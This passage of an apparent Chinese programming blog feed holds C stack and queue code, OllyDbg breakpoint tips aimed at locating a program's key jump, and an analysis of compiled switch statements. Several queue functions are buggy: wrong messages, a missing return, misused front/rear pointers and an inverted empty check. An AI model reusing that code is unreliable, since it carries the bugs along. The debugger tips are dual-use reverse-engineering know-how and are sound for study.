class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">PushStack</span><span class="params">(SeqStack *s,datatype x)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">if</span> (s-&gt;top == MAX - <span class="number">1</span>)  <span class="comment">//栈从0开始计算的。</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"栈满\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line">s-&gt;top++;</div><div class="line">s-&gt;data[s-&gt;top] = x;</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>出栈：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">PopStack</span><span class="params">(SeqStack *s, datatype *x)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">if</span> (s-&gt;top == <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"栈空\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line">*x = s-&gt;data[s-&gt;top];</div><div class="line">s-&gt;top--;</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>取栈顶：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">datatype <span class="title">TopStack</span><span class="params">(SeqStack *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">if</span> (s-&gt;top == <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"栈空\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> s-&gt;data[s-&gt;top];</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>遍历栈：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">   <span class="function"><span class="keyword">void</span> <span class="title">ShowStack</span><span class="params">(SeqStack *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> tmp = s-&gt;top;</div><div class="line"><span class="keyword">while</span> (s-&gt;top != <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, s-&gt;data[s-&gt;top]);</div><div class="line">s-&gt;top--;</div><div class="line">&#125;</div><div class="line">s-&gt;top = tmp;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;栈的概念：&quot;&gt;&lt;a href=&quot;#栈的概念：&quot; class=&quot;headerlink&quot; title=&quot;栈的概念：&quot;&gt;&lt;/a&gt;栈的概念：&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;栈是一种只允许在一端进行插入或者删除的线性表，他是一种操作受限的线性表，在表中只允许进行插入或者删除的一端叫做栈顶另一端叫做栈底。栈具有先进后出（Last in first out）的性质。&lt;/strong&gt;
    
    </summary>
    
      <category term="数据结构" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>OD断点设置技巧</title>
    <link href="http://yoursite.com/2017/11/10/OD%E6%96%AD%E7%82%B9%E8%AE%BE%E7%BD%AE%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2017/11/10/OD断点设置技巧/</id>
    <published>2017-11-10T08:45:11.000Z</published>
    <updated>2017-11-21T05:35:23.132Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>断点是一个信号，它通知调试器，在某个特定点上暂时将程序执行挂起。当执行在某个断点处挂起时，我们称程序处于中断模式。进入中断模式并不会终止或结束程序的执行。执行可以在任何时候继续。断点的本质还是一种中断。</strong><a id="more"></a></p><h1 id="主要的四种断点设置方式："><a href="#主要的四种断点设置方式：" class="headerlink" title="主要的四种断点设置方式："></a>主要的四种断点设置方式：</h1><p>1.字符串断点<br>2.API断点<br>3.条件断点<br>4.run跟踪断点</p><ul><li>断点设置：<ul><li>API断点：<ul><li>1.可以在菜单栏—API断点处下断</li><li>2.在命令行输入 bp+API函数名字，然后执行到返回（alt+F9）</li></ul></li><li>条件断点：<ul><li>1.运行</li><li>2.在window窗口找到Edit（需要刷新）记录句柄信息</li><li>3.在反汇编窗口，ctrl+G输入函数名字，定位在函数里面</li><li>4.shift+F2设置条件断点，条件为【esp+4】==Edit地址</li><li><strong>注意：esp+4是句柄信息（也是GetWindowTextW的第一个参数)；条件是断在call的第一个参数处！！</strong></li></ul></li><li>run追踪：<ul><li>1.Ctrl+E 找到程序模块<br><img src="https://i.imgur.com/8sq9suE.png" alt=""></li><li>2.Ctrl+T 暂停run跟踪条件，输入如下信息（选中EIP位于范围内，范围是基址和大小）<br><img src="https://i.imgur.com/TRcA3SG.png" alt=""></li><li>3.运行。</li><li>补充内容：<ul><li>在反汇编窗口的快捷菜单中选择“Run跟踪［Run trace］|添加到所有函数入口处［Add entries of all procedures］”，<font color="#DC143C">这样能够检查每个可识别的函数被调用的次数。</font></li><li>另一个命令“Run跟踪［Run trace］|添加到函数中所有的分支［Add branches in procedure］”<font color="#DC143C">会强行跟踪此函数中所有识别的跳转目的地址的内容。</font>在这种情况下，统计功能能够找到最频繁执行的分支，您可以优化这部分的代码，以提高速度。</li><li>在反汇编窗口中的某条命令上使用快捷菜单中选择“搜索［Search for］|Run跟踪的最新记录［Last record in run trace］”用于查找该命令是否被执行过，如果执行过，最后一次执行在哪里。  </li></ul></li></ul></li></ul></li><li>其他断点设置：<ul><li>1.万能断点:ebp hmemcpy<ul><li>ebp 在调用函数处下断（bp是指在调用函数内部下断）</li><li>hmemcpy—16位函数，截获大部分的字符串输入</li></ul></li><li>2.条件断点参考:<a href="http://bbs.pediy.com/thread-16494.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-16494.htm</a></li><li>3.合适于xp的万能断点：<ul><li>1）首先查看user32模块</li><li>2）Ctrl+B，利用字符串·搜索F3 A5 8B C8 83 E1 03 F3 A4 E8</li><li>3）或者：8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 E8</li><li>4）在停的地方下断，此时代码处在系统领空</li><li>5）alt+F9，回到程序领空</li></ul></li><li><strong>4.利用消息断点寻找关键跳转：</strong><ul><li>1）打开“windows”窗口（程序运行）</li><li>2）在一些关键的地方设置消息断点（选择那些容易触发事件的地方）</li><li>3）根据条件设置断点类型（如202鼠标右键消息类型）</li><li>4）此时会断在系统领空，我们按Alt+F9回到用户·代码<br><img src="https://i.imgur.com/KuaDdHq.png" alt=""></li><li>5)补充：<ul><li>对于这片文章<a href="http://bbs.pediy.com/showthread.php?t=46520" target="_blank" rel="external">http://bbs.pediy.com/showthread.php?t=46520</a>出现下消息断点输入不完整的情况可以，下完断点，禁止断点，然后运行输入完毕后（不要点击确定）激活断点，运行就可！</li></ul></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;断点是一个信号，它通知调试器，在某个特定点上暂时将程序执行挂起。当执行在某个断点处挂起时，我们称程序处于中断模式。进入中断模式并不会终止或结束程序的执行。执行可以在任何时候继续。断点的本质还是一种中断。&lt;/strong&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈数据结构之队列</title>
    <link href="http://yoursite.com/2017/11/09/%E6%B5%85%E8%B0%88%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E9%98%9F%E5%88%97/"/>
    <id>http://yoursite.com/2017/11/09/浅谈数据结构之队列/</id>
    <published>2017-11-09T03:00:11.000Z</published>
    <updated>2017-11-21T05:35:23.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="队列的定义："><a href="#队列的定义：" class="headerlink" title="队列的定义："></a>队列的定义：</h1><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;队列是一种特殊的线性表，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。需要注意的是：<font color="#DC143C">入队的时候是队尾入队，出队的时候是队头出队</font></strong><br><a id="more"></a></p><h1 id="队列的存储形式："><a href="#队列的存储形式：" class="headerlink" title="队列的存储形式："></a>队列的存储形式：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与线性表和栈类似，队列也有<font color="#DC143C">顺序存储和链式存储</font>两种存储结构。</p><ul><li><font color="#DC143C">顺序存储(循环队列)</font>：即有一组地址连续的存储单元依次存放队列中的数据元素，一般情况下使用以为数组来作为队列的顺序存储空间。为了避免尾巴在头的前面我们采取的循环队列的处理方式。首尾相接的循环表构建方法我们采用的是求模的方法。 <pre><code>类型定义：  typedef struct  {      datatype data[MAX];      int rear,front;  }SeQueue;</code></pre>    <pre><code>置空队列：  SeQueue *InitQueue()   //置空队列  {      SeQueue *p = (SeQueue*)malloc(sizeof(SeQueue));      p->front = p->rear = MAX-1;   //首尾指针指向相同的地方，MAX-1，输入时正好对头在第一个位置。      return p;  }</code></pre>   <pre><code>入队列：  int InQueue(SeQueue *p, datatype x)  //入队列  {      if ((p->rear + 1) % MAX == (p->front))  //首先看是否已满      {          printf("队满");          return FALSE;      }      else      {    p->data[p->rear] = x;             //先入队列在指针加1，和先指针+1在入队列不一样          p->rear = (p->rear + 1) % MAX;          return TRUE;      }  }</code></pre><pre><code>出队列:  int OutQueue(SeQueue *p, datatype *x)  //出队列  {      if (p->front == p->rear)      {          printf("队列已满");          return FALSE;      }      else      {          *x = p->data[p->front];          p->front=(p->front+1)%MAX;          return 0;      }  }</code></pre><pre><code>判队空:  int EmptyQueue(SeQueue *p)     //判队空  {      if (p->front == p->rear)   //空      {          printf("队列为空\n");          return 1;      }          else          return 0;  }</code></pre><pre><code>显示:  void ShowQueue(SeQueue *p)  {      int i;      for (i = p->front; i != p->rear; i=(i+1)%MAX)          printf("%c ", p->data[i]);  }</code></pre></li><li><p><font color="#DC143C">链式存储：</font>如果用户不知道需要的内存大小，可以采用链式存储结构，和链栈一样，使用单链表实现链队列，为了操作方便，可以使用带头结点的单链表表示队列，并设置头指针和尾指针，头指针指向队头结点，尾指针指向队尾节点。</p><pre><code>  typedef struct node  {      datatype data;      struct node *next;  }Qnode;     //链式队列的节点  typedef struct  {      Qnode *front;      Qnode *rear;  }LQueue;   //链式队列的头指针节点  LQueue *InitQueue()  {      LQueue *q = (LQueue*)malloc(sizeof(LQueue));      Qnode *p = (Qnode*)malloc(sizeof(Qnode));      p->next = NULL;      q->front = q->rear = p;   //头指向建立好的节点  }  /*----------------------------  注意：front指针永远指向第一个节点  --------------------------------*/  void InQueue(LQueue *q, datatype x)   //入队列  {      Qnode *p = (Qnode*)malloc(sizeof(Qnode));      p->data = x;      p->next = NULL;      q->front->next = p;     //目的是使队列和新加入的节点链接起来      q->front = p;           //母的是使头指针的rear指针指向队尾  }  /*----------------------------------  注意：队首出队列  -----------------------------------*/  int OutQueue(LQueue *q, datatype *x)  {      Qnode *p;      if (!EmptyQueue(q))  //队列为空          return FALSE;      else      {          *x = q->front->data;          p = q->front->next;     //p指向第一个节点          q ->front->next= p->next;    //头指针指向第一个节点的下一个节点          free(p);      }      if (q->front->next==NULL)    //队列中只有最后一个数据了      {              q->front = q->rear;          return TRUE;      }  }  int EmptyQueue(LQueue *q)      //判队空  {      if (q->front == q->rear)      {          printf("队列为空\n");          return 1;      }      else          return 0;  }</code></pre></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;队列的定义：&quot;&gt;&lt;a href=&quot;#队列的定义：&quot; class=&quot;headerlink&quot; title=&quot;队列的定义：&quot;&gt;&lt;/a&gt;队列的定义：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;队列是一种特殊的线性表，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。需要注意的是：&lt;font color=&quot;#DC143C&quot;&gt;入队的时候是队尾入队，出队的时候是队头出队&lt;/font&gt;&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="数据结构" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>switch结构逆向分析</title>
    <link href="http://yoursite.com/2017/11/06/switch%E7%BB%93%E6%9E%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/11/06/switch结构逆向分析/</id>
    <published>2017-11-06T09:02:11.000Z</published>
    <updated>2017-11-21T05:35:23.133Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>暑假看了看雪的知识库，偶然间看到这篇besterChen写的switch结构分析一文，甚喜之，原封不动的抄了下来，在此表示非常感谢。这是在暑假的word版经过复核及重新测试，发现原文许多反汇编代码与原先语句有出入，可能是现在编译器更加高级了。为了保证原文的统一和完整性，在此没有对原文代码进行修改，只是在后面进行了补充，形式为图片类型。随后也会附上关于本次的测试样本（<a href="http://pan.baidu.com/s/1gfo0ejx" target="_blank" rel="external">http://pan.baidu.com/s/1gfo0ejx</a>），</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>switch 结构的逆向难度在于不同分支的switch通过反编译器可能演变成不同的汇编语言版本，这就要求逆向工程师精确掌握反汇编switch的规律。灵活的运用调试器进行调试。</strong><br><a id="more"></a></p><h1 id="1-case-lt-3的情况："><a href="#1-case-lt-3的情况：" class="headerlink" title="1.case&lt;=3的情况："></a>1.case&lt;=3的情况：</h1><p>先看第一个程序段：</p><p><pre><code><br>    switch (nscore)<br>    {<br>    case 1:<br>        ntmpNum = 1;<br>        break;<br>    case 3:<br>        ntmpNum = 3;<br>        break;<br>    case 4:<br>        ntmpNum = 4;<br>        break;<br>    default:<br>        ntmpNum = 10;<br>    }<br>    printf(“%d”, ntmpNum); // 要调用一下ntmpNum，否则上面的switch会被优化掉<br></code></pre><br>OD载入，看一下：</p><p><pre><code><br>    00401013 &gt;|.  E8 0F010000    call    00401127     ;scanf<br>    00401018  |.  8B4424 08      mov     eax, dword ptr [esp+8]<br>    0040101C  |?  83C4 08        add     esp, 8          ; 上面scanf是C类调用<br>    0040101F  |?  48             dec     eax       ; 通过EAX的减法来判断属于哪个分支<br>    00401020  |?  74 1D          je      short 0040103F<br>    00401022  |.  83E8 02        sub     eax, 2<br>    00401025  .  74 11          je      short 00401038<br>    00401027      48             dec     eax<br>    00401028      74 07          je      short 00401031<br>    0040102A      B8 0A000000    mov     eax, 0A<br>    0040102F      EB 13          jmp     short 00401044   ;break<br>    00401031  |.  B8 04000000    mov     eax, 4<br>    00401036  |.  EB 0C          jmp     short 00401044<br>    00401038  |?  B8 03000000    mov     eax, 3<br>    0040103D  |?  EB 05         jmp     short 00401044<br>    0040103F  |?  B8 01000000    mov     eax, 1<br>    00401044  |.  50             push    eax<br>    00401045  |?  68 38904000    push    00409038       ;  ASCII “%d”<br></code></pre><br>通过上述反汇编代码，我们容易得知：在有规律的switch语句中，汇编代码显得有规律，和if语句一致。测试结果与原文一致。</p><h1 id="2-case项多于3项且有规律的情况："><a href="#2-case项多于3项且有规律的情况：" class="headerlink" title="2.case项多于3项且有规律的情况："></a>2.case项多于3项且有规律的情况：</h1><p>第一个程序段：</p><p><pre><code><br>    scanf(“%d”, &amp;nscore);<br>    switch (nscore)<br>    {<br>        case 3:<br>            ntmpNum = 1;<br>               break;<br>        case 1:<br>            ntmpNum = 3;<br>            break;<br>        case 5:<br>            ntmpNum = 4;<br>            break;<br>        case 9:<br>            ntmpNum = 4;<br>            break;<br>        case 7:<br>            ntmpNum = 4;<br>            break;<br>        case 11:<br>            ntmpNum = 4;<br>            break;<br>        default:<br>            ntmpNum = 10;<br>    }<br>    printf(“%d”, ntmpNum); // 要调用一下ntmpNum，否则上面的switch会被优化掉<br></code></pre><br>这段代码，我们将有规律的case打乱顺序，然后看编译器是怎么处理的。<br>OD中查看反汇编形式：</p><p><pre><code><br>    0040100E  |.  68 38904000   push    00409038            ; ASCII “%d”<br>    00401013  |.  E8 3F010000   call    00401157            ; scanf<br>    00401018  |.  8B4C24 08     mov     ecx, dword ptr [esp+8]  ;得到输入的内容<br>    0040101C  |.  83C4 08       add     esp, 8<br>    0040101F  |.  8D41 FF       lea     eax, dword ptr [ecx-1]  ;输入的内容-1; Switch (cases 1..B)<br>    00401022  |.  83F8 0A       cmp     eax, 0A<br>    00401025  |.  77 1C         ja      short 00401043<br>    00401027  |.  FF2485 641040&gt;jmp     dword ptr [eax*4+401064] ;查表，跳转到对应的CASE中<br>    0040102E  |&gt;  B8 01000000   mov     eax, 1             ;  Case 3 of switch 0040101F<br>    00401033  |.  EB 13         jmp     short 00401048<br>    00401035  |&gt;  B8 03000000   mov     eax, 3             ;  Case 1 of switch 0040101F<br>    0040103A  |.  EB 0C         jmp     short 00401048<br>    0040103C  |&gt;  B8 04000000   mov     eax, 4             ;  Cases 5,7,9,B of switch 0040101F<br>    00401041  |.  EB 05         jmp     short 00401048<br>    00401043  |&gt;  B8 0A000000   mov     eax, 0A            ;  Default case of switch 0040101F<br>    00401048  |&gt;  50            push    eax<br>    00401049  |.  68 38904000   push    00409038           ;  ASCII “%d”<br>    0040104E  |.  E8 D3000000   call    00401126           ;  printf<br></code></pre><br>跟随下这个表，我们发现，这个表就在调用它的函数后，如下：</p><p><pre><code><br>    00401064  00401035  switch.00401035<br>    00401068  00401043  switch.00401043          插入的是default分支的首地址<br>    0040106C  0040102E  switch.0040102E<br>    00401070  00401043  switch.00401043          插入的是default分支的首地址<br>    00401074  0040103C  switch.0040103C<br>    00401078  00401043  switch.00401043          插入的是default分支的首地址<br>    0040107C  0040103C  switch.0040103C<br>    00401080  00401043  switch.00401043          插入的是default分支的首地址<br>    00401084  0040103C  switch.0040103C<br>    00401088  00401043  switch.00401043          插入的是default分支的首地址<br>    0040108C  0040103C  switch.0040103C<br></code></pre></p><font color="#DC143C">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;认真对比一下这个表，发现，它先是对case后的常量排序，然后再将对应的处理代码的首地址写成一个表，通过jmp   dword ptr [eax*4+401064] 查表直接进入到对应的case中。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于缺省的case（我们是间隔2递增的case）在表中填充的是default分支的首地址。</font><ul><li>补充：<ul><li>我输入的是3，也就是case语句的第二个语句（1.3.5….）</li><li>利用IDA pro查看分支表，如图：<br><img src="https://i.imgur.com/fGlHnLG.png" alt=""></li><li>然后查看od跳转的地方（401341）：<br><img src="https://i.imgur.com/bdTKhlv.png" alt=""></li><li>对比od可以知道：401377是默认分支，其他是有效的的case分支。也就是IDA pro显示的分支表中的2.4.6.8….如图，可以知道：在分支表存在的顺序按照nscore排列。<br><img src="https://i.imgur.com/EWEajcb.png" alt=""></li></ul></li></ul><h1 id="3-多于三项部分有规律的情况"><a href="#3-多于三项部分有规律的情况" class="headerlink" title="3.多于三项部分有规律的情况:"></a>3.多于三项部分有规律的情况:</h1><p><strong>（1）上个我们发现，它会给缺省的case表项中填补default分支的首地址，那我们将这个间隔调大，观察一下编译器会怎么处理，代码段如下：</strong></p><p><pre><code><br>    scanf(“%d”, &amp;nscore);<br>    switch (nscore)<br>    {<br>        case 1:<br>            ntmpNum = 1;<br>            break;<br>        case 2:<br>            ntmpNum = 2;<br>            break;<br>        case 3:<br>            ntmpNum = 3;<br>            break;<br>    //这里丢失20多个case<br>        case 26:<br>            ntmpNum = 26;<br>            break;<br>        case 27:<br>            ntmpNum = 27;<br>            break;<br>        case 28:<br>            ntmpNum = 28;<br>            break;<br>        default:<br>            ntmpNum = 10;<br>    }<br>    printf(“%d”, ntmpNum); // 要调用一下ntmpNum，否则上面的switch会被优化掉<br></code></pre><br>反汇编观察一下：</p><p><pre><code><br>    0040100E    68 38904000     push    00409038                      ; ASCII “%d”<br>    00401013    E8 6F010000     call    00401187                      ; scanf<br>    00401018    8B4C24 08       mov     ecx, dword ptr [esp+8]        ; 得到输入的内容<br>    0040101C    83C4 08         add     esp, 8<br>    0040101F    8D41 FF         lea     eax, dword ptr [ecx-1]        ; 输入的内容-1<br>    00401022    83F8 1B         cmp     eax, 1B<br>    00401025    77 39           ja      short 00401060<br>    00401027    33D2            xor     edx, edx<br>    00401029    8A90 9C104000   mov     dl, byte ptr [eax+40109C]     ; 检索case的下标索引值表<br>    ;它参与运算从地址表中找到对应的case地址<br>    0040102F    FF2495 80104000 jmp     dword ptr [edx*4+401080]<br>    ; 通过值表填充的CASE索引值，查地址表<br>    00401036    B8 01000000     mov     eax, 1<br>    0040103B    EB 28           jmp     short 00401065                  ; break<br>    0040103D    B8 02000000     mov     eax, 2<br>    00401042    EB 21           jmp     short 00401065<br>    00401044    B8 03000000     mov     eax, 3<br>    00401049    EB 1A           jmp     short 00401065<br>    0040104B    B8 1A000000     mov     eax, 1A<br>    00401050    EB 13           jmp     short 00401065<br>    00401052    B8 1B000000     mov     eax, 1B<br>    00401057    EB 0C           jmp     short 00401065<br>    00401059    B8 1C000000     mov     eax, 1C<br>    0040105E    EB 05           jmp     short 00401065<br>    00401060    B8 0A000000     mov     eax, 0A<br>    00401065    50              push    eax<br>    00401066    68 38904000     push    00409038                         ; ASCII “%d”<br></code></pre><br>下标索引表：</p><p><pre><code><br>    0040109C    00          DB 00    case 1的索引值<br>    0040109D    01          DB 01    case 2的索引值<br>    0040109E    02          DB 02    case 3的索引值<br>    0040109F    06          DB 06    下面全部填充default的索引值<br>    004010A0    06          DB 06<br>    …<br>    004010B4    06          DB 06<br>    004010B5    03          DB 03    case 4的索引值<br>    004010B6    04          DB 04    case 5的索引值<br>    004010B7    05          DB 05    case 6的索引值<br></code></pre><br>这样查两个表，缺省的case项在索引表中插入 default 的索引值，这样每个case项就节省了3个字节的空间。</p><p><pre><code><br>    mov     dl, byte ptr [eax+40109C]   // 40109C是索引表首地址<br>    jmp     dword ptr [edx*4+401080]    // 401080是跳转地址表的首地址。<br></code></pre></p><ul><li><p>补充：</p><ul><li>根据OD和IDA的联合调试，发现这个和上面的方法是一样的。直接使用的是地址值，并没有经过索引表来中介传输。<br><img src="https://i.imgur.com/9tMLKKV.png" alt=""><br><img src="https://i.imgur.com/s6wouQW.png" alt=""><br><strong>（2）我们继续增大这个case之间的差距，让它超过255，代码段如下：</strong><br><pre><code><br>scanf(“%d”, &amp;nscore)；<br>switch (nscore)<br>{<br>  case 1:<pre><code>ntmpNum = 1;break;</code></pre>  case 2:<pre><code>ntmpNum = 2;break;</code></pre>  case 3:<pre><code>ntmpNum = 3;break;</code></pre>  //这里丢失几个case<br>  case 326:<pre><code>ntmpNum = 26;break;</code></pre>  case 327:<pre><code>ntmpNum = 27;break;</code></pre>  case 328:<pre><code>ntmpNum = 28;break;</code></pre>  default:<pre><code>ntmpNum = 10;</code></pre>}<br>printf(“%d”, ntmpNum); // 要调用一下ntmpNum，否则上面的switch会被优化掉<br></code></pre><br>反汇编看一下效果：<br><pre><code><br>00401018    8B4424 08       mov     eax, dword ptr [esp+8]  ; 得到输入的内容<br>0040101C    83C4 08         add     esp, 8<br>0040101F    3D 46010000     cmp     eax, 146            ; 判断是不是大case中最小的<br>00401024    7F 27           jg      short 0040104D    ; 如果大于，就进入大case中比较<br>00401026    74 1E           je      short 00401046    ; 如果相等就直接进入0x146的case代码段<br>00401028    48              dec     eax            ; 否则就到小的case段中比较。<br>00401029    74 14           je      short 0040103F<br>0040102B    48              dec     eax<br>0040102C    74 0A           je      short 00401038<br>0040102E    48              dec     eax<br>0040102F    75 26           jnz     short 00401057    ; default了。<br>00401031    B8 03000000     mov     eax, 3<br>00401036    EB 32           jmp     short 0040106A<br>00401038    B8 02000000     mov     eax, 2<br>0040103D    EB 2B           jmp     short 0040106A<br>0040103F    B8 01000000     mov     eax, 1<br>00401044    EB 24           jmp     short 0040106A<br>00401046    B8 1A000000     mov     eax, 1A<br>0040104B    EB 1D           jmp     short 0040106A<br>0040104D    2D 47010000     sub     eax, 147<br>; 减去一个case项值，得到一个差值，这样就可以判断大case了。<br>00401052    74 11           je      short 00401065<br>00401054    48              dec     eax<br>00401055    74 07           je      short 0040105E<br>00401057    B8 0A000000     mov     eax, 0A<br>0040105C    EB 0C           jmp     short 0040106A<br>0040105E    B8 1C000000     mov     eax, 1C<br>00401063    EB 05           jmp     short 0040106A<br>00401065    B8 1B000000     mov     eax, 1B<br>0040106A    50              push    eax<br>0040106B    68 38904000     push    00409038            ; ASCII “%d”<br>00401070    E8 B1000000     call    00401126<br></code></pre><br>看到了么？这里就分成了两段，每段当做if来处理的，我想应该是我们每段的case数量太少，我们让上面的case 数量大于3个试试，看看会不会是只要大于三项的有规律case就查表，少于等于3项的就当成if来处理。</li></ul></li><li><p>补充：</p><ul><li>我也不清楚为什么编译器会和146.147.148这三个数比较，然后跳入第二次default。<br><img src="https://i.imgur.com/BPjANEv.png" alt=""></li></ul></li></ul><p>代码如下：</p><p><pre><code><br>    scanf(“%d”, &amp;nscore);<br>    switch (nscore)<br>    {<br>        case 1:<br>            ntmpNum = 1;<br>            break;<br>        case 2:<br>            ntmpNum = 2;<br>            break;<br>        case 3:<br>            ntmpNum = 3;<br>            break;<br>        case 4:<br>            ntmpNum = 4;<br>            break;<br>        case 5:<br>            ntmpNum = 5;<br>            break;<br>        //这里丢失几个case<br>        case 326:<br>            ntmpNum = 326;<br>            break;<br>        case 327:<br>            ntmpNum = 327;<br>            break;<br>        case 328:<br>            ntmpNum = 328;<br>            break;<br>        default:<br>            ntmpNum = 10;<br>    }<br>    printf(“%d”, ntmpNum); // 要调用一下ntmpNum，否则上面的switch会被优化掉<br></code></pre><br>反汇编看下效果：</p><p><pre><code><br>    0040100E    68 38904000     push    00409038                         ; ASCII “%d”<br>    00401013    E8 5F010000     call    00401177                         ; scanf<br>    00401018    8B4424 08       mov     eax, dword ptr [esp+8]           ; 得到输入的内容<br>    0040101C    83C4 08         add     esp, 8<br>    0040101F    3D 46010000     cmp     eax, 146<br>    00401024    7F 39           jg      short 0040105F<br>    00401026    74 30           je      short 00401058<br>    00401028    48              dec     eax<br>    00401029    83F8 04         cmp     eax, 4<br>    0040102C    77 3B           ja      short 00401069<br>    0040102E    FF2485 98104000 jmp     dword ptr [eax*4+401098]<br>    00401035    B8 01000000     mov     eax, 1<br>    0040103A    EB 40           jmp     short 0040107C<br>    0040103C    B8 02000000     mov     eax, 2<br>    00401041    EB 39           jmp     short 0040107C<br>    00401043    B8 03000000     mov     eax, 3<br>    00401048    EB 32           jmp     short 0040107C<br>    0040104A    B8 04000000     mov     eax, 4<br>    0040104F    EB 2B           jmp     short 0040107C<br>    00401051    B8 05000000     mov     eax, 5<br>    00401056    EB 24           jmp     short 0040107C<br>    00401058    B8 46010000     mov     eax, 146<br>    0040105D    EB 1D           jmp     short 0040107C<br>    0040105F    2D 47010000     sub     eax, 147<br>    00401064    74 11           je      short 00401077<br>    00401066    48              dec     eax<br>    00401067    74 07           je      short 00401070<br>    00401069    B8 0A000000     mov     eax, 0A<br>    0040106E    EB 0C           jmp     short 0040107C<br>    00401070    B8 48010000     mov     eax, 148<br>    00401075    EB 05           jmp     short 0040107C<br>    00401077    B8 47010000     mov     eax, 147<br>    0040107C    50              push    eax<br>    0040107D    68 38904000     push    00409038                         ; ASCII “%d”<br>    00401082    E8 BF000000     call    00401146<br></code></pre><br>跳转表如下：</p><p><pre><code><br>    00401098  00401035  switch.00401035<br>    0040109C  0040103C  switch.0040103C<br>    004010A0  00401043  switch.00401043<br>    004010A4  0040104A  switch.0040104A<br>    004010A8  00401051  switch.00401051<br></code></pre><br>哈哈，不多说了，我们看下无规律的情况。</p><ul><li>补充（原文的反汇编代码和这次实验不一样，原文存在地址表，这个不存在）<ul><li>可能是利用最优二叉树算法得到的中间的146.147.148的值。<br><img src="https://i.imgur.com/NuuD0FS.png" alt=""><br><img src="https://i.imgur.com/T7M4S7F.png" alt=""><br><img src="https://i.imgur.com/ViSkkB0.png" alt=""><h1 